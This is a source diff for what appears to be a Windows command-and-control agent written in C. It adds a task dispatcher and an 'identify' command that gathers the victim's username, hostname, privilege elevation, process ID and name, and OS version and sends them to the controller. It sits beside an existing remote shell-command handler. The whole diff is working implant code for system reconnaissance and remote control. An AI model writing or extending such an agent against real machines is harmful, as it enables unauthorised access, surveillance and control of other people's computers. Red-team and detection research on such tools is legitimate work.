@@ -1,14 +1,35 @@
-#include <communication.h>
-#include <tlv.h>
+#include <lmcons.h>
+
+#include <windows_utils.h>
+
 #include <stdio.h>
 #include <types.h>
+#include <communication.h>
 #include <commands.h>
 
-#define COMMAND_COUNT 1
+#define COMMAND_COUNT 2
 
 Command commands[COMMAND_COUNT] = {
-  {.id = 7, .function = shell_cmd }
+  {.id = 0, .function = identify_cmd },
+  {.id = 7, .function = shell_cmd },
 };
+
+void execute_cmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
+
+  printf("[+] Got task ID: %u\n", taskId);
+  printf("    -> ActionId: %u\n", taskActionId); 
+  printf("    -> ArgsBuf: %.*s (%u bytes)\n", tlv->bufsize, tlv->buf, tlv->bufsize); 
+
+  for (int i = 0; i < COMMAND_COUNT; i++)
+  {
+    if (taskActionId == commands[i].id)
+    {
+      commands[i].function(taskId, argc, tlv);
+      break;
+    }
+  }
+
+}
 
 void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   if (argc < 1) return;
@@ -93,3 +114,49 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   free(out.buf);
 }
 
+void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
+  printf("[+] agent is identifying..\n");
+  
+  struct TLVBuild identifyMessage;
+  identifyMessage.buf = malloc(50);
+  identifyMessage.allocsize = 50;
+  identifyMessage.bufsize = 0;
+
+  char * username = malloc(UNLEN + 1);
+  DWORD usernameLen = UNLEN + 1;
+  GetUserNameA(username, &usernameLen);
+
+  char * hostname = malloc(UNLEN + 1);
+  DWORD hostnameLen = UNLEN + 1;
+  GetComputerNameA(hostname, &hostnameLen);
+  
+  DWORD pid = GetProcessId(GetCurrentProcess());
+  char * processName = malloc(260);
+  getProcessName(pid, processName);
+
+  OSVERSIONINFOEXW osinfo;
+  agent.functions.RtlGetVersion(&osinfo);
+
+  addString(&identifyMessage, username);
+  addString(&identifyMessage, hostname);
+  addByte(&identifyMessage, (char)IsProcessElevated());
+  addString(&identifyMessage, "windows");
+  addInt32(&identifyMessage, pid);
+  addString(&identifyMessage, processName);
+  addInt32(&identifyMessage, osinfo.dwMajorVersion);
+  addInt32(&identifyMessage, osinfo.dwMinorVersion);
+  addInt32(&identifyMessage, osinfo.dwBuildNumber);
+
+  send_output(
+    taskId,
+    "identify",
+    "",
+    identifyMessage.bufsize, 
+    identifyMessage.buf
+  );
+  
+  free(username);
+  free(hostname);
+  free(processName);
+  free(identifyMessage.buf);
+}
